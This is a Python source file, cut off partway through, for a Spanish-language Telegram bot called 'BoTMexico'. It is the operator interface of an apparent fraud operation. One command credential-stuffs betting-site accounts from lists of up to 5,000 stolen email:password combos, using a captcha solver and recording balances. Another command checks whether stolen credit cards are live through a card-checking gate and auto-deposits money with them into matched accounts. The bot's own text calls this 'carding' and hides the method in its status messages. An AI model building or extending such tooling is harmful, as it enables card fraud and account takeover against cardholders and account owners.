"""Telegram Bot Mock — Versión simplificada y desacoplada del bot de Telegram.
Implementa únicamente los comandos requeridos: /start, /help, /cancel, /botmex, /check y /bet.
Usa la misma BD compartida y los motores de login / matchmaking del dashboard.
"""

import asyncio
import os
import random
import sys
import time
from pathlib import Path
from typing import List, Dict, Any, Tuple

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
    BotCommandScopeChat,
)
from telegram.request import HTTPXRequest
from telegram.error import NetworkError, TimedOut, Conflict
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)

# Permitir imports directos desde el directorio del bot
_MOCK_DIR = Path(__file__).parent.resolve()
if str(_MOCK_DIR) not in sys.path:
    sys.path.insert(0, str(_MOCK_DIR))

try:
    from telegram_bot_mock.config import (
        logger,
        MOCK_BOT_TOKEN,
        DASHBOARD_URL,
        SUPERADMIN_ID,
        is_authorized,
        DB_PATH,
        HEADER_LOCKUP,
        get_user_nickname,
    )
except ImportError:
    from config import (
        logger,
        MOCK_BOT_TOKEN,
        DASHBOARD_URL,
        SUPERADMIN_ID,
        is_authorized,
        DB_PATH,
        HEADER_LOCKUP,
        get_user_nickname,
    )

# Imports del dashboard & bot core
from app import filter_and_sanitize_check_combos, db, _persist_auto_mission
from login_orchestrator import gentle_login
from prewarm import (
    _db_upsert_balance,
    _db_save_txns_and_recalc,
    _db_mark_dead,
    _fetch_looks_empty,
)
from card_checker import precheck_card_liveness, format_ruthopia_liveness_summary
from auto_deposit import plan_auto_mission, run_auto_mission
from deposits import _mission_sem

# Frases de saludo dinámicas (Slang directo)
POC_GREETINGS = [
    "Hey,",
    "¡Qué pedo!",
    "¿Cómo andas?",
    "¿Qué onda,",
    "¡Listo pa' darle!",
    "¿Qué trampa,",
    "¡Échale,",
]

# Barras en 2a Persona Directa con Variación de Métricas (Estructuras de Rap Complejas)
# Flow escrito: 4 barras, rima al final de cada línea, métrica pareja pa' que se lea y se escuche.
RAP_DISCLAIMERS = [
    "Buenas compa carder, qué bueno que traes feria, ya te habías tardado.\nDijiste que el billete iba a salir de cualquier lado,\npero le bajaste a tu mamá los doscientos del mandado\ny me trajiste puro carbón, ni un LIVE bien cargado. 🥩🔥",
    "Llegaste muy picudo presumiendo que traías el truco aprendido,\nte fundiste la feria del mandado pa' meterte en este ruido.\nTraes tres CCs quemadas de un checker sin sentido\ny crees que con ChatGPT vas a salir del olvido. 💀⚡",
    "Soñabas con tu Airbnb en automático y un cashout de revista,\nandabas de mamador en Discord dándotela de artista.\nTe vendieron puro carbón esos vagos de la lista\ny en BoTMexico te dejo sin saldo y fuera de vista. 🚀💸",
    "Creíste que con abliteración ya te dabas de exquisito,\nte fundiste los doscientos pesitos en un mito.\nTus combos de Telegram salieron muertos de a bonito\ny te apagué el asador antes de empezar tu escrito. 🎤🥩",
    "Traes la cara de hacker y el bolsillo pelado en ceros,\nte quemaste la feria del mandado con estafadores rateros.\nAquí BoTMexico no consuela noobs ni escucha tus peros:\no tiras la CC correcta o te regresas a los primeros. 🌵⚡",
]


def get_random_greeting() -> str:
    return f'<i>"{random.choice(RAP_DISCLAIMERS)}"</i>'


def get_random_poc_greeting(nickname: str) -> str:
    poc = random.choice(POC_GREETINGS)
    return f"<b>{poc} {nickname}!</b> 👋"


def get_random_rap_intro() -> str:
    return random.choice(RAP_DISCLAIMERS)


# Membrete Oficial BoTMexico
HEADER_DECORATIVE = (
    "═════════════════════════\n"
    "🇲🇽  🌵 · <b><code>ʙ ᴏ ᴛ · ᴍ ᴇ x ɪ ᴄ ᴏ</code></b> · 🌵  🇲🇽\n"
    "═════════════════════════"
)

HEADER = HEADER_DECORATIVE

# Estados de Conversación
(WAIT_CHECK_CONFIRM, WAIT_BET_CONFIRM, WAIT_ADDUSER_INPUT) = range(3)


# Eventos de confirmación en espera para /bet confirm_gate
_confirm_events: Dict[str, Tuple[asyncio.Event, Dict[str, Any]]] = {}

# Misiones cerradas por el gate (stop_sched_) — evita que on_progress
# sobrescriba el mensaje limpio de cancelación con el texto terminal leaky.
_gate_closed_missions: set = set()


def _mission_status_text(status: str, extra: dict) -> str:
    """Texto de status para on_progress — anti-fuga de método operativo.

    4 caminos de cierre (handoff 2026-08-05 §2 Área A):
    1. failed → sin cifras (nunca hubo depósito real)
    2. completed + stopped_by_user → sin cifras (solo probe de $10)
    3. cancelled → sin cifras (ya limpio)
    4. completed sin stopped_by_user → solo $ total, NUNCA aprobados/fallidos
    """
    if status == "matching":
        return f"⏳ Rastreando cuentas aptas en el pool ({extra.get('accounts', 0)} disponibles)..."
    elif status == "logging_in":
        email = extra.get("email", "")
        step = extra.get("current", 1)
        total = extra.get("total", 1)
        pct = int((step / total) * 100) if total > 0 else 0
        return f"🔄 Acceso seguro en curso [{step}/{total}] ({pct}%)\n  └ <code>{email}</code>"
    elif status == "match":
        email = extra.get("email", "")
        step = extra.get("current", 1)
        total = extra.get("total", 1)
        return f"🎯 Cuenta objetivo lista [{step}/{total}]\n  └ <code>{email}</code>"
    elif status == "cooldown":
        email = extra.get("email", "")
        step = extra.get("current", 1)
        total = extra.get("total", 1)
        return f"⏳ Enfriamiento táctico [{step}/{total}]\n  └ <code>{email}</code>"
    elif status == "awaiting_confirmation":
        return "⚠️ Llenado automático listo para confirmación"
    elif status == "preparing":
        return "⏳ Preparando…"
    elif status == "scheduling":
        fake_pct = extra.get("fake_pct", 0)
        return f"⚡ Procesando… {fake_pct}%"
    elif status == "completed":
        if extra.get("stopped_by_user"):
            return "🛑 Proceso detenido antes del llenado."
        dep = extra.get("deposited", 0)
        accts = extra.get("accounts", 0)
        return f"✅ Misión completada. Depositado: ${dep:.0f} en {accts} cuentas."
    elif status == "cancelled":
        return "🛑 Detenido por el operador"
    elif status == "failed":
        return "❌ No se encontró match viable."
    else:
        return f"⏳ {status}"


# ─────────────────────────────────────────────────────────────────────
# COMANDOS BÁSICOS (Estilo BoTMexico)
# ─────────────────────────────────────────────────────────────────────


def _logo_path() -> Path:
    return Path(__file__).resolve().parent.parent / "static" / "assets" / "botmexico_logo_new.png"


def _start_menu_msg(user_id: int, nickname: str):
    """Construye mensaje + teclado del menú principal (/start y 'Volver al inicio')."""
    poc_saludo = get_random_poc_greeting(nickname)
    rap_intro = get_random_rap_intro()
    msg = (
        f"{HEADER}\n\n"
        f"{poc_saludo}\n"
        f"• ID Telegram: <code>{user_id}</code>\n\n"
        f"🎤 <i>{rap_intro}</i>"
    )
    kb = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("💳 CC Auto-Match", callback_data="btn_start_bet")],
            [
                InlineKeyboardButton(
                    "🔑 Check Combos/Accesos", callback_data="btn_start_check"
                )
            ],
            [InlineKeyboardButton("❔ Ayuda", callback_data="btn_start_help")],
            [InlineKeyboardButton("🇲🇽 botmexico.net (Dashboard)", url=DASHBOARD_URL)],
        ]
    )
    return msg, kb


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start — Entrada con membrete oficial, logo, saludo dinámico por apodo, ID y rap sátira."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text(
            f"{HEADER}\n\nAcceso denegado.", parse_mode="HTML"
        )
        return

    nickname = get_user_nickname(user_id, update.effective_user.first_name)
    msg, kb = _start_menu_msg(user_id, nickname)

    try:
        with open(_logo_path(), "rb") as f:
            await update.message.reply_photo(
                photo=f, caption=msg, parse_mode="HTML", reply_markup=kb
            )
    except FileNotFoundError:
        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=kb)


async def _edit_msg(query, text: str, reply_markup=None):
    """Edita el mensaje del callback: usa edit_message_caption si el mensaje
    original tiene foto (el /start envía foto+caption), sino edit_message_text.

    Fixes 'There is no text in the message to edit' cuando se toca un botón
    del /start (mensaje con media)."""
    if query.message and query.message.photo:
        await query.edit_message_caption(
            caption=text, parse_mode="HTML", reply_markup=reply_markup
        )
    else:
        await query.edit_message_text(
            text=text, parse_mode="HTML", reply_markup=reply_markup
        )


async def start_buttons_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback para botones rápidos del /start."""
    query = update.callback_query
    await query.answer()
    if query.data == "btn_start_bet":
        kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ]
            ]
        )
        await _edit_msg(
            query,
            f"{HEADER}\n\n"
            "💳 <b>Auto Deposito [CC Auto-match] (/BET)</b>\n\n"
            "Pega tus CeCes en formato:\n"
            "<code>4111111111111111|12|28|123</code>\n\n"
            "🌵 Una por línea (máximo 4 tarjetas por intento).\n"
            "🇲🇽 <b>BoTMexico</b> encuentra una cuenta para tu CC 💳\n"
            "🤖 One Click & Watcha la magia...\n\n"
            f"<i>{get_random_greeting()}</i>",
            reply_markup=kb,
        )
        return WAIT_BET_CONFIRM
    elif query.data == "btn_start_check":
        kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ]
            ]
        )
        await _edit_msg(
            query,
            f"{HEADER}\n\n"
            "📥 <b>VERIFICACIÓN COMBOS (/check)</b>\n\n"
            "Envía combos en chat (máx 100) o archivo .txt (máx 5,000):\n"
            "<code>correo:contraseña</code>\n\n"
            f"<i>{get_random_greeting()}</i>",
            reply_markup=kb,
        )
        return WAIT_CHECK_CONFIRM
    elif query.data == "btn_start_help":
        msg = (
            f"{HEADER}\n\n"
            "<b>Manual Operativo BoTMexico:</b>\n\n"
            "• <b>/bet</b> — 💳 CC Auto-Match\n"
            "  Pega 1 a 4 tarjetas <code>num|mm|yy|cvv</code> (o escribe <code>/bet &lt;tarjetas&gt;</code> directo).\n"
            "  <i>Valida liveness vía Ruthopia gate, hace match y liquida de una.</i>\n\n"
            "• <b>/check</b> — 🔑 Check Combos/Accesos\n"
            "  Envía combos <code>correo:pass</code> en chat (máx 100) o adjunta <code>.txt</code> (máx 5,000).\n"
            "  <i>Valida balance y estado sin tocar saldo ni quemar cuentas.</i>\n\n"
            "• <b>/botmex</b> — 🇲🇽 botmexico.net (Dashboard)\n"
            "  Enlace directo al núcleo del Dashboard de Operador.\n\n"
            "• <b>/help</b> — ❔ Ayuda\n"
            "  Muestra esta guía rápida de instrucciones.\n\n"
            "• <b>/cancel</b> — 🛑 Cancelar/Detener proceso\n"
            "  Cancela cualquier misión activa y libera cuentas de inmediato.\n\n"
            f"  🌵 {get_random_greeting()}\n"
        )
        kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "💳 CC Auto-Match", callback_data="btn_start_bet"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🇲🇽 botmexico.net (Dashboard)", url=DASHBOARD_URL
                    )
                ],
            ]
        )
        await _edit_msg(query, msg, reply_markup=kb)
    elif query.data == "btn_start_cancel":
        user_id = update.effective_user.id
        with db(write=True) as c:
            c.execute(
                "UPDATE auto_missions SET status='cancelled' "
                "WHERE operator_id=? AND status IN ('pending', 'running', 'paused')",
                (user_id,),
            )
        context.user_data.clear()
        nickname = get_user_nickname(user_id, update.effective_user.first_name)
        home_msg, home_kb = _start_menu_msg(user_id, nickname)
        await _edit_msg(query, home_msg, reply_markup=home_kb)
        return ConversationHandler.END


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help — Guía rápida con membrete oficial y jerga de operador."""
    msg = (
        f"{HEADER}\n\n"
        "<b>Manual Operativo BoTMexico:</b>\n\n"
        "• <b>/bet</b> — 💳 CC Auto-Match\n"
        "  Pega 1 a 4 tarjetas <code>num|mm|yy|cvv</code> (o escribe <code>/bet &lt;tarjetas&gt;</code> directo).\n"
        "  <i>Valida liveness vía Ruthopia gate, hace match y liquida de una.</i>\n\n"
        "• <b>/check</b> — 🔑 Check Combos/Accesos\n"
        "  Envía combos <code>correo:pass</code> en chat (máx 100) o adjunta <code>.txt</code> (máx 5,000).\n"
        "  <i>Valida balance y estado sin tocar saldo ni quemar cuentas.</i>\n\n"
        "• <b>/botmex</b> — 🇲🇽 botmexico.net (Dashboard)\n"
        "  Enlace directo al núcleo del Dashboard de Operador.\n\n"
        "• <b>/help</b> — ❔ Ayuda\n"
        "  Muestra esta guía rápida de instrucciones.\n\n"
        "• <b>/cancel</b> — 🛑 Cancelar/Detener proceso\n"
        "  Cancela cualquier misión activa y libera cuentas de inmediato.\n\n"
        f"  🌵 {get_random_greeting()}\n"
    )
    kb = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("💳 CC Auto-Match", callback_data="btn_start_bet")],
            [
                InlineKeyboardButton(
                    "🏠 Volver al inicio", callback_data="btn_start_cancel"
                )
            ],
            [InlineKeyboardButton("🇲🇽 botmexico.net (Dashboard)", url=DASHBOARD_URL)],
        ]
    )
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=kb)


async def botmex_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /botmex."""
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("🌐 Entrar al Portal", url=DASHBOARD_URL)]]
    )
    await update.message.reply_text(
        f"{HEADER}\n\n"
        f"Acceso directo al portal web:\n{DASHBOARD_URL}\n\n"
        f"🌵 {get_random_greeting()}",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /cancel — Aborta misiones y limpia estado de conversación."""
    user_id = update.effective_user.id

    with db(write=True) as c:
        c.execute(
            "UPDATE auto_missions SET status='cancelled' "
            "WHERE operator_id=? AND status IN ('pending', 'running', 'paused')",
            (user_id,),
        )

    context.user_data.clear()
    await update.message.reply_text(
        f"{HEADER}\n\n🛑 <b>Proceso abortado.</b>\nOperaciones detenidas limpiamente.",
        parse_mode="HTML",
    )
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────
# FLUJO /ADDUSER
# ─────────────────────────────────────────────────────────────────────

async def adduser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada /adduser — exclusivo Superadmin."""
    user_id = update.effective_user.id
    if user_id != SUPERADMIN_ID:
        await update.message.reply_text("❌ Comando exclusivo para Superadmin.")
        return ConversationHandler.END

    args = context.args or []
    if len(args) >= 2:
        # Formato directo: /adduser <ID> <Apodo> [rol]
        tg_id_str, nickname = args[0], args[1]
        role = args[2].lower() if len(args) >= 3 else "operator"
        try:
            tg_id = int(tg_id_str)
            from auth import add_user
            u = add_user(nickname, tg_id, role)
            await update.message.reply_text(
                f"✅ <b>Usuario registrado con éxito</b>\n\n"
                f"• <b>Apodo:</b> {u['display']}\n"
                f"• <b>Telegram ID:</b> <code>{u['telegram_id']}</code>\n"
                f"• <b>Rol:</b> {u['role']}\n\n"
                f"<i>Al ingresar a la web por primera vez con el usuario <b>{u['display']}</b>, se le pedirá definir contraseña.</i>",
                parse_mode="HTML",
            )
            return ConversationHandler.END
        except ValueError:
            await update.message.reply_text("❌ ID inválido. Debe ser numérico.")
            return ConversationHandler.END

    await update.message.reply_text(
        "👤 <b>REGISTRAR NUEVO USUARIO</b>\n\n"
        "Envía los datos del usuario en el siguiente formato:\n"
        "<code>ID Apodo [rol]</code>\n\n"
        "<b>Ejemplo:</b>\n"
        "<code>7847239854 Luisito operator</code>\n"
        "<code>1234567890 Pedro admin</code>\n\n"
        "<i>Roles válidos: operator (defecto), admin, superadmin.</i>",
        parse_mode="HTML",
    )
    return WAIT_ADDUSER_INPUT


async def process_adduser_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa el texto ingresado para /adduser."""
    user_id = update.effective_user.id
    if user_id != SUPERADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    text = (update.message.text or "").strip()
    parts = text.split()
    if len(parts) < 2:
        await update.message.reply_text(
            "⚠️ Formato incorrecto. Envía: <code>ID Apodo [rol]</code> (Ej: <code>7847239854 Luisito operator</code>)",
            parse_mode="HTML",
        )
        return WAIT_ADDUSER_INPUT

    tg_id_str, nickname = parts[0], parts[1]
    role = parts[2].lower() if len(parts) >= 3 else "operator"

    try:
        tg_id = int(tg_id_str)
    except ValueError:
        await update.message.reply_text("❌ El ID de Telegram debe ser un número.")
        return WAIT_ADDUSER_INPUT

    from auth import add_user
    u = add_user(nickname, tg_id, role)
    await update.message.reply_text(
        f"✅ <b>Usuario registrado con éxito</b>\n\n"
        f"• <b>Apodo:</b> {u['display']}\n"
        f"• <b>Telegram ID:</b> <code>{u['telegram_id']}</code>\n"
        f"• <b>Rol:</b> {u['role']}\n\n"
        f"<i>Al ingresar a la web por primera vez con el usuario <b>{u['display']}</b>, se le pedirá definir contraseña.</i>",
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada para /check — Recibe texto o archivo .txt."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    await update.message.reply_text(
        "📥 <b>ENVÍA LOS COMBOS A VERIFICAR</b>\n\n"
        "• Pegados en chat: Máximo 100 líneas.\n"
        "• Archivo .txt: Adjunta el documento (máximo 5,000 líneas).\n\n"
        "<i>Formato: correo:contraseña (opcional :tarjeta|mm|yy|cvv)</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="cancel_check"
                    )
                ]
            ]
        ),
    )
    return WAIT_CHECK_CONFIRM


async def process_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa el texto o documento enviado para /check."""
    user_id = update.effective_user.id
    combos = []

    if update.message.document:
        doc = update.message.document
        if not doc.file_name.endswith(".txt"):
            await update.message.reply_text(
                "❌ Solo se admiten archivos con extensión .txt"
            )
            return WAIT_CHECK_CONFIRM

        file_obj = await context.bot.get_file(doc.file_id)
        content_bytes = await file_obj.download_as_bytearray()
        try:
            text_content = content_bytes.decode("utf-8", errors="ignore")
        except Exception:
            text_content = content_bytes.decode("latin-1", errors="ignore")

        combos = [line.strip() for line in text_content.splitlines() if line.strip()]
        if len(combos) > 5000:
            await update.message.reply_text(
                "❌ El archivo supera el límite de 5,000 líneas."
            )
            return WAIT_CHECK_CONFIRM

    elif update.message.text:
        text = update.message.text.strip()
        if text.startswith("/"):
            await update.message.reply_text(
                "❌ Envía la lista de combos, no un comando."
            )
            return WAIT_CHECK_CONFIRM
        combos = [line.strip() for line in text.splitlines() if line.strip()]
        if len(combos) > 100:
            await update.message.reply_text(
                "❌ Máximo 100 combos en chat. Para más, adjunta un archivo .txt (hasta 5,000)."
            )
            return WAIT_CHECK_CONFIRM

    if not combos:
        await update.message.reply_text("❌ No se encontraron combos en la entrada.")
        return WAIT_CHECK_CONFIRM

    filtered = filter_and_sanitize_check_combos(combos)
    valid_list = filtered["valid_combos"]

    if not valid_list:
        summary_msg = (
            f"<b>❌ NINGÚN COMBO SUPERÓ LAS VALIDACIONES</b>\n\n"
            f"• <b>Recibidos:</b> {filtered['total_received']}\n"
            f"• <b>Duplicados:</b> {filtered['dupes_count']}\n"
            f"• <b>Ya existen en BD (Correo):</b> {len(filtered['in_db_emails'])}\n"
            f"• <b>Ya existen en BD (Tarjeta):</b> {len(filtered['in_db_cards'])}\n"
            f"• <b>Tarjetas Inválidas / Luhn:</b> {len(filtered['invalid_cards'])}\n\n"
            f"💡 <i>Las cuentas omitidas se pueden consultar en {DASHBOARD_URL}</i>"
        )
        await update.message.reply_text(summary_msg, parse_mode="HTML")
        return ConversationHandler.END

    # Guardar en context para la confirmación
    context.user_data["pending_check"] = valid_list
    context.user_data["filtered_summary"] = filtered

    confirm_msg = (
        f"<b>⚠️ CONFIRMACIÓN DE CHECK SOLICITADA</b>\n\n"
        f"• <b>Total Recibidos:</b> {filtered['total_received']}\n"
        f"• <b>Duplicados Omitidos:</b> {filtered['dupes_count']}\n"
        f"• <b>Ya en BD (Omitidos):</b> {len(filtered['in_db_emails']) + len(filtered['in_db_cards'])}\n"
        f"• <b>Tarjetas Inválidas:</b> {len(filtered['invalid_cards'])}\n"
        f"• <b>Nuevos a Verificar:</b> <b>{len(valid_list)}</b>\n\n"
        f"<i>¿Deseas iniciar la verificación?</i>"
    )
    kb = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("✅ Iniciar Check", callback_data="confirm_check"),
                InlineKeyboardButton(
                    "🏠 Volver al inicio", callback_data="cancel_check"
                ),
            ]
        ]
    )
    await update.message.reply_text(confirm_msg, parse_mode="HTML", reply_markup=kb)
    return WAIT_CHECK_CONFIRM


async def handle_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja los botones de confirmación de /check."""
    query = update.callback_query
    await query.answer()

    if query.data == "cancel_check":
        context.user_data.pop("pending_check", None)
        await query.edit_message_text("❌ Verificación /check cancelada.")
        return ConversationHandler.END

    if query.data == "confirm_check":
        valid_combos = context.user_data.get("pending_check", [])
        if not valid_combos:
            await query.edit_message_text("❌ No hay combos pendientes.")
            return ConversationHandler.END

        await query.edit_message_text(
            f"🚀 <b>Iniciando /check para {len(valid_combos)} combo(s)...</b>",
            parse_mode="HTML",
        )

        # Ejecución asíncrona de verificación
        asyncio.create_task(
            _run_check_task(
                query.message.chat_id,
                context.bot,
                valid_combos,
                update.effective_user.id,
            )
        )
        return ConversationHandler.END


async def _run_check_task(
    chat_id: int, bot, valid_combos: List[Dict[str, Any]], operator_id: int
):
    """Ejecuta el ciclo de gentle_login + balance check para cada combo válido."""
    cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get(
        "BMX_CAPMONSTER_KEY", ""
    )

    from betmexico_login_service import make_pool

    pool = make_pool(cap_key, size=2, workers=1) if cap_key else None

    hits_count = 0
    dead_count = 0
    errors_count = 0
    total = len(valid_combos)

    status_msg = await bot.send_message(
        chat_id=chat_id,
        text=f"⏳ <b>Progreso Check:</b> 0/{total} procesados...",
        parse_mode="HTML",
    )

    try:
        from betmexico_login_api import BetmexicoApiChecker

        for idx, item in enumerate(valid_combos, 1):
            email = item["email"]
            password = item["password"]
            card_pipe = item.get("card_pipe", "")

            login_res = await gentle_login(
                email,
                password,
                max_login_retries=3,
                throttle=True,
                pool=pool,
                use_cache=True,
            )

            if login_res.ok and login_res.jwt:
                jwt = login_res.jwt
                async with BetmexicoApiChecker() as checker:
                    try:
                        details = await asyncio.wait_for(
                            checker.fetch_account_details_parallel(
                                jwt, fetch_mode="balance_only"
                            ),
                            timeout=15.0,
                        )
                    except Exception:
                        details = None

                if details and not _fetch_looks_empty(details):
                    _db_upsert_balance(email, details)
                    _db_save_txns_and_recalc(
                        email, details, operator_id
                    )
                    hits_count += 1
                else:
                    hits_count += 1
            elif login_res.account_dead:
                _db_mark_dead(email, f"Check Login Failed: {login_res.error}")
                dead_count += 1
            else:
                errors_count += 1

            if idx % 2 == 0 or idx == total:
                try:
                    await status_msg.edit_text(
                        f"⏳ <b>Progreso Check:</b> {idx}/{total} procesados...\n"
                        f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass

        final_text = (
            f"<b>✅ VERIFICACIÓN /CHECK FINALIZADA</b>\n\n"
            f"• <b>Total Procesados:</b> {total}\n"
            f"• <b>Cuentas Vivas (HITS):</b> {hits_count}\n"
            f"• <b>Cuentas Muertas (DEAD):</b> {dead_count}\n"
            f"• <b>Errores de Red / Captcha:</b> {errors_count}\n\n"
            f"🌐 <i>Consulta detalles completos en el dashboard web.</i>"
        )
        await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
    except Exception as ex:
        logger.error(
            f"[Check] Error inesperado en _run_check_task: {ex}", exc_info=True
        )
        await bot.send_message(chat_id=chat_id, text=f"❌ Error durante el check: {ex}")
    finally:
        if pool:
            await pool.stop()


# ─────────────────────────────────────────────────────────────────────
# FLUJO /BET
# ─────────────────────────────────────────────────────────────────────


async def _animate_loading_dots(message, base_text: str, total_seconds: float = 10.0):
    """Anima puntos suspensivos en el mensaje de feedback durante N segundos."""
    dots = [".  ", ".. ", "..."]
    end_time = time.time() + total_seconds
    idx = 0
    while time.time() < end_time:
        dot_str = dots[idx % len(dots)]
        idx += 1
        try:
            await message.edit_text(
                f"{base_text}\n\n  Espera{dot_str}", parse_mode="HTML"
            )
        except Exception:
            pass
        await asyncio.sleep(0.8)


async def bet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada para /bet — Solicita tarjetas o procesa si venían en args."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    # Verificar si el usuario envió tarjetas directamente junto al comando: /bet 4111...|12|28|123
    args = context.args
    if args:
        raw_text = " ".join(args)
        return await process_bet_input(update, context, override_text=raw_text)

    msg = (
        f"{HEADER}\n\n"
        "💳 <b>Auto Deposito [CC Auto-match] (/BET)</b>\n\n"
        "Pega tus CeCes en formato:\n"
        "<code>4111111111111111|12|28|123</code>\n\n"
        "🌵 Una por línea (máximo 4 tarjetas por intento).\n"
        "🇲🇽 <b>BoTMexico</b> encuentra una cuenta para tu CC 💳\n"
        "🤖 One Click & Watcha la magia...\n\n"
        f"🌵 {get_random_greeting()}"
    )
    await update.message.reply_text(
        msg,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="cancel_bet")]]
        ),
    )
    return WAIT_BET_CONFIRM


async def process_bet_input(update: Update, context: ContextTypes.DEFAULT_TYPE, override_text: Optional[str] = None):
    """Procesa las tarjetas ingresadas para /bet con feedback animado y liveness premium."""
    text = (override_text or (update.message.text if update.message else "") or "").strip()
    if text.startswith("/") and not any(char.isdigit() for char in text):
        await update.message.reply_text("❌ Envía las tarjetas, no un comando.")
        return WAIT_BET_CONFIRM

    # Limpiar líneas de tarjetas
    lines = [
        line.strip()
        for line in text.splitlines()
        if line.strip() and not line.startswith("/")
    ]
    if not lines and text.startswith("/bet"):
        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            lines = [line.strip() for line in parts[1].splitlines() if line.strip()]

    if not lines or len(lines) > 4:
        await update.message.reply_text(
            "❌ Debes enviar entre 1 y 4 tarjetas por intento."
        )
        return WAIT_BET_CONFIRM

    operator_id = update.effective_user.id
    MAX_DAILY_STRIKES = 5

    # Comprobar strikes
    with db(write=True) as c:
        row = c.execute(
            "SELECT strikes_count, penalty_until FROM operator_penalties WHERE telegram_id=?",
            (operator_id,),
        ).fetchone()
        strikes_count = (row["strikes_count"] or 0) if row else 0

    if strikes_count >= MAX_DAILY_STRIKES:
        await update.message.reply_text(
            f"{HEADER}\n\n"
            f"❌ <b>Límite de {MAX_DAILY_STRIKES} strikes diarios alcanzado.</b> Contacta al SuperAdmin.\n"
            f"<i>Los strikes previenen el quema de pasarelas con tarjetas inválidas.</i>",
            parse_mode="HTML",
        )
        return ConversationHandler.END

    # Validar liveness (liveness HTTP de Ruthopia deshabilitado e invisible)
    valid_pipes = []
    liveness_records = []
    for pipe in lines:
        ok, reason, parsed = precheck_card_liveness(pipe)
        liveness_records.append({"pipe": pipe, "ok": ok, "status_label": reason})
        logger.info(
            f"[CARD_TOUCH] operator={operator_id} | account=N/A(precheck) | "
            f"pipe={pipe} | status={'live' if ok else 'dead'} | reason={reason}"
        )
        if ok:
            valid_pipes.append(parsed["pipe_3parts"])

    summary_text = format_ruthopia_liveness_summary(liveness_records)
    strikes_left = MAX_DAILY_STRIKES - strikes_count
    live_count = len(valid_pipes)

    if not valid_pipes:
        fail_msg = (
            f"{HEADER}\n\n"
            f"🏴‍☠️ <b>CARDING FALLIDO — CCs SIN VIDA</b>\n\n"
            f"• 💳 CCs LIVE: <b>0</b>\n"
            f"• ⚠️ Strikes acumulados: <b>{strikes_count} / {MAX_DAILY_STRIKES}</b>\n"
            f"  <i>(Ojo: no quemes la pasarela tirando CCs quemadas)</i>\n\n"
            f"{summary_text}\n\n"
            f"🌵 <i>{get_random_greeting()}</i>"
        )
        kb_fail = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ],
            ]
        )
        await update.message.reply_text(
            fail_msg, parse_mode="HTML", reply_markup=kb_fail
        )
        return ConversationHandler.END

    if _mission_sem.locked():
        await update.message.reply_text(
            "⚠️ Ya hay una misión de depósitos activa en el sistema. Intenta de nuevo en unos momentos."
        )
        return ConversationHandler.END

    amount = 150.0
    target_count = 9

    plan = plan_auto_mission(DB_PATH, valid_pipes, amount, target_count)
    if not plan["feasible"]:
        await update.message.reply_text(
            f"❌ No fue posible armar el plan: {plan['reason']}"
        )
        return ConversationHandler.END

    from uuid import uuid4
    mission_id = str(uuid4())[:8]
    user_info = {
        "telegram_id": operator_id,
        "username": update.effective_user.username or "operator",
    }

    _persist_auto_mission(
        mission_id, operator_id, valid_pipes, amount, target_count, plan
    )

    # Mensaje base inicial de la misión — SIN links ni botones al portal dashboard
    status_msg = await update.message.reply_text(
        f"{HEADER}\n\n"
        f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
        f"• Estado: Rastreando cuentas aptas…\n\n"
        f"<i>Buscando cuentas y tarjetas viables en segundo plano…</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🛑 Detener Misión",
                        callback_data=f"stop_mission_{mission_id}",
                    )
                ],
